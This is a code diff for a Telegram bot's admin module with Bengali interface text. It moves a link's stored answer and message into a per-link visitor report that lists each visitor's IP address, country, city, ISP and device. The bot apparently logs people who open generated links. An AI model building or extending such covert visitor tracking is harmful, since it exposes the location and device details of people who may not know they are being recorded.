@@ -177,17 +177,6 @@ const setupAdmin = (bot, db, saveDB, isAdmin, baseDir, locale) => {
         showAdminDashboard(ctx, db, true);
     });
 
-    bot.action(/^view_ans_msg_(.+)$/, (ctx) => {
-        if (!isAdmin(ctx.chat.id)) return ctx.answerCbQuery().catch(() => {});
-        const data = db.linkDatabase[ctx.match[1]];
-        if (!data) return ctx.answerCbQuery("⚠️ লিঙ্কটি ডাটাবেজে পাওয়া যায়নি।", { show_alert: true }).catch(() => {});
-        
-        const ansText = data.answer ? data.answer : "উত্তর আসেনি!";
-        const msgText = data.message ? data.message : "মেসেজ আসেনি!";
-        
-        return ctx.answerCbQuery(`ans: ${ansText}\nmsg: ${msgText}`, { show_alert: true }).catch(() => {});
-    });
-
     bot.action(/^view_vi_(.+)$/, async (ctx) => {
         if (!isAdmin(ctx.chat.id)) return ctx.answerCbQuery().catch(() => {});
         const linkId = ctx.match[1];
@@ -210,7 +199,12 @@ const setupAdmin = (bot, db, saveDB, isAdmin, baseDir, locale) => {
             const model = v.deviceModel && v.deviceModel !== "Unknown" ? v.deviceModel : "";
             const deviceDetails = (vendor || model) ? `${vendor} ${model}`.trim() : "Unknown Device";
 
+            const ansVal = data.hostAnswer ? data.hostAnswer : "উত্তর আসেনি!";
+            const msgVal = data.message ? data.message : "মেসেজ আসেনি!";
+
             report += `${index + 1}. 🗓️ Time: ${v.time}\n` +
+                      `💬 Answer: ${ansVal}\n` +
+                      `✉️ Message: ${msgVal}\n` +
                       `🌐 IP: ${v.ip}\n` +
                       `🌍 Country: ${v.country} | City: ${v.city}\n` +
                       `📡 ISP: ${v.isp}\n` +
